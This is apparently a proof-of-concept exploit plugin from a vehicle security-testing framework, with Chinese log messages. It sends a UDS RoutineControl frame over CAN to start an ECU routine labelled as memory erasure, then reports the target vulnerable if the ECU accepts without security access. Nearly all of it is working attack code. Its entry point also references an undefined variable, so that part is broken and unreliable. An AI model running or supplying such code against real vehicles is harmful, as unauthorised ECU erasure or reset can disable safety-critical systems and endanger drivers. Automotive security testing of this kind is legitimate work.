"""
PoC Name: UDS RoutineControl Abuse
CVE: N/A
Component: Canbus Stack
Category: Canbus
Severity: Critical
CVSS: 8.0
Description: UDS 0x31服务未授权执行ECU例程(擦除/重置等)
Prerequisites: SocketCAN接口, python-can库。
Usage: python3 27_UDS_RoutineControl.py <can_interface>
"""
import sys
from iv_plugin_base import IVIVulnerabilityPlugin
class UDSRoutineControlPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self): return True
    def exploit(self):
        iface = self.params.get("can_interface", "can0")
        self.logger.info(f"UDS RoutineControl测试 ({iface})...")
        try:
            import can
            bus = can.interface.Bus(channel=iface, bustype="socketcan")
            # RoutineControl: startRoutine(0x01), routineID=0xDF01 (EraseMemory variant)
            msg = can.Message(arbitration_id=0x7E0,
                data=[0x04, 0x31, 0x01, 0xDF, 0x01, 0x00, 0x00, 0x00],
                is_extended_id=False)
            bus.send(msg)
            resp = bus.recv(timeout=2.0)
            if resp and len(resp.data) > 1:
                if resp.data[1] == 0x71:
                    self.logger.warning("[+] 例程执行成功！缺少安全访问控制")
                    self.results["vulnerable"] = True
                    self.results["evidence"] = f"Routine started: {resp.data.hex()}"
                elif resp.data[1] == 0x7F:
                    nrc = resp.data[3] if len(resp.data) > 3 else 0
                    self.logger.info(f"例程被拒绝 NRC=0x{nrc:02X}")
                    self.results["vulnerable"] = False
            else:
                self.results["vulnerable"] = False
            bus.shutdown()
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"UDS测试失败: {e}")
            self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 27_UDS_RoutineControl.py <can_interface>")
        sys.exit(1)
    plugin = UDSRoutineControlPlugin({"target_ip": "N/A", "can_interface": iface})
    plugin.run_verify()
